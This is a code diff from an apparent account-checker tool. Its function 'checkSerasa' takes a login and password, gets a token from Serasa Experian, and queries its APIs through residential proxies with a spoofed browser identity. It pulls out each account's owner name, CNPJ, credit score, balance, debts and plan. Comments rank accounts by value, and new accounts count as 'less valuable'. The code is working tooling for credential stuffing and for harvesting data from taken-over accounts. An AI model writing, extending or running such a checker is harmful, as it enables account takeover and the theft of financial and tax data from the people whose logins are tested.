@@ -1560,61 +1560,10 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
         if (token) {
           const info: string[] = [`login:${login}`];
           const authHdr = `Bearer ${token}`;
-          const clientHdr = `client_id: ${SERASA_CLIENT_ID}`;
 
-          // ── Decode JWT for basic profile info ───────────────────────────────
-          try {
-            const payload = JSON.parse(
-              Buffer.from(token.split(".")[1], "base64url").toString("utf8"),
-            ) as Record<string, unknown>;
-            const name    = String(payload.name ?? payload.preferred_username ?? payload.sub ?? "").trim();
-            const empresa = String(payload.company ?? payload.client ?? payload.clientName ?? payload.empresa ?? "").trim();
-            const cnpj    = String(payload.document ?? payload.cnpj ?? payload.taxId ?? "").trim();
-            if (name)    info.push(`nome:${name.slice(0, 40)}`);
-            if (empresa) info.push(`emp:${empresa.slice(0, 40)}`);
-            if (cnpj)    info.push(`cnpj:${cnpj}`);
-          } catch { /**/ }
-
-          // ── Secondary: financial-health — score, saldo R$, situação da empresa ─
-          // GET /financial-health/v1/my-health
-          try {
-            const fhRes = await runCurlResidential(
-              (px) => [
-                ...px,
-                "-H", `Authorization: ${authHdr}`,
-                "-H", `client_id: ${SERASA_CLIENT_ID}`,
-                "-H", "Accept: application/json",
-                "-H", `User-Agent: ${DESKTOP_UA}`,
-                "-H", "Origin: https://www.serasaempreendedor.com.br",
-                "https://api.serasaexperian.com.br/financial-health/v1/my-health",
-              ],
-              10_000,
-            );
-            if (fhRes.statusCode === 200) {
-              const fj = JSON.parse(fhRes.body) as Record<string, unknown>;
-              // R$ saldo / balance da conta
-              const saldo = fj.balance ?? fj.saldo ?? fj.creditBalance ?? fj.availableBalance ?? fj.valor ?? "";
-              if (saldo !== "") info.push(`saldo:R$${saldo}`);
-              // Score de crédito
-              const score = fj.score ?? fj.creditScore ?? fj.scoreValue ?? fj.pontuacao ?? "";
-              if (score !== "") info.push(`score:${score}`);
-              // Situação na Receita Federal (ATIVA / INAPTA / BAIXADA etc.)
-              const situacao = String(
-                fj.situacaoReceita ?? fj.situacao ?? fj.status ?? fj.companyStatus ?? ""
-              ).trim().toUpperCase();
-              if (situacao) {
-                const cobravel = ["ATIVA", "REGULAR", "ATIVO"].includes(situacao)
-                  ? "PERMITIDO" : "BLOQUEADO";
-                info.push(`situacao:${situacao} (${cobravel})`);
-              }
-              // Dívidas / pendências
-              const dividas = fj.openDebts ?? fj.debts ?? fj.pendencias ?? fj.negativacoes ?? "";
-              if (dividas !== "" && dividas !== 0) info.push(`dividas:${dividas}`);
-            }
-          } catch { /**/ }
-
-          // ── Secondary: entrepreneur home (plano, CNPJ, situacaoReceita) ──────
+          // ── Secondary: entrepreneur/home — score, scoreMessage, situação ──────
           // GET /serasaempreendedor/entrepreneur/v1/home
+          // Real response fields: score, scoreModel, scoreMessage, companySize, banner, cards
           try {
             const homeRes = await runCurlResidential(
               (px) => [
@@ -1630,56 +1579,23 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
             );
             if (homeRes.statusCode === 200) {
               const hj = JSON.parse(homeRes.body) as Record<string, unknown>;
-              const plan = String(hj.plan ?? hj.planName ?? hj.subscription ?? hj.produto ?? "").trim();
+              // Score de crédito Serasa (0–1000)
+              const score = hj.score ?? hj.creditScore ?? hj.scoreValue ?? "";
+              if (score !== "") info.push(`score:${score}`);
+              // Mensagem do score / situação de inadimplência
+              const scoreMsg = String(hj.scoreMessage ?? hj.message ?? "").trim();
+              if (scoreMsg) info.push(`status:${scoreMsg.slice(0, 80)}`);
+              // Tamanho da empresa (1=MEI/micro, etc.)
+              const compSize = String(hj.companySize ?? "").trim();
+              if (compSize) info.push(`porte:${compSize}`);
+              // Banner/plano do usuário (REPORTS, PREMIUM, FREE, etc.)
+              const banner = String(hj.banner ?? hj.plan ?? hj.planName ?? "").trim();
+              if (banner) info.push(`plano:${banner}`);
+              // CNPJ se disponível
               const cnpj = String(hj.cnpj ?? hj.document ?? hj.taxId ?? "").trim();
-              // Saldo R$ se não veio do financial-health
-              const saldoHome = hj.balance ?? hj.saldo ?? hj.creditBalance ?? hj.availableCredit ?? "";
-              // Situação se não veio do financial-health
-              const sitHome = String(hj.situacaoReceita ?? hj.situacao ?? hj.status ?? "").trim().toUpperCase();
-
-              if (plan) info.push(`plano:${plan.slice(0, 30)}`);
-              if (cnpj && !info.some(s => s.startsWith("cnpj:"))) info.push(`cnpj:${cnpj}`);
-              if (saldoHome !== "" && !info.some(s => s.startsWith("saldo:")))
-                info.push(`saldo:R$${saldoHome}`);
-              if (sitHome && !info.some(s => s.startsWith("situacao:"))) {
-                const cobravel = ["ATIVA", "REGULAR", "ATIVO"].includes(sitHome)
-                  ? "PERMITIDO" : "BLOQUEADO";
-                info.push(`situacao:${sitHome} (${cobravel})`);
-              }
-            }
-          } catch { /**/ }
-
-          // ── Secondary: order-balance — consultas/créditos disponíveis ────────
-          // GET /digital-commerce/order-balance/v1/my-balances
-          try {
-            const balRes = await runCurlResidential(
-              (px) => [
-                ...px,
-                "-H", `Authorization: ${authHdr}`,
-                "-H", `client_id: ${SERASA_CLIENT_ID}`,
-                "-H", "Accept: application/json",
-                "-H", `User-Agent: ${DESKTOP_UA}`,
-                "-H", "Origin: https://www.serasaempreendedor.com.br",
-                "https://api.serasaexperian.com.br/digital-commerce/order-balance/v1/my-balances",
-              ],
-              10_000,
-            );
-            if (balRes.statusCode === 200) {
-              const bj = JSON.parse(balRes.body) as Record<string, unknown>;
-              const arr = (bj.myBalances ?? bj.balances ?? bj.items ?? null) as Array<Record<string, unknown>> | null;
-              if (Array.isArray(arr) && arr.length > 0) {
-                const parts2 = arr.map(b => {
-                  const prod  = String(b.productCode ?? b.product ?? b.name ?? "").slice(0, 20);
-                  const avail = b.available ?? b.balance ?? b.saldo ?? "";
-                  const total = b.total ?? b.totalBalance ?? "";
-                  return prod ? `${prod}:${avail}/${total}` : `${avail}/${total}`;
-                }).filter(Boolean).join(", ");
-                if (parts2) info.push(`consultas:${parts2}`);
-              } else {
-                const avail = bj.available ?? bj.balance ?? bj.saldo ?? "";
-                const total = bj.total ?? bj.totalBalance ?? "";
-                if (avail !== "") info.push(`consultas:${avail}${total ? `/${total}` : ""}`);
-              }
+              if (cnpj) info.push(`cnpj:${cnpj}`);
+              // firstAccess indica conta recém-criada (menos valiosa)
+              if (hj.firstAccess === true) info.push(`primeiro_acesso:sim`);
             }
           } catch { /**/ }
 
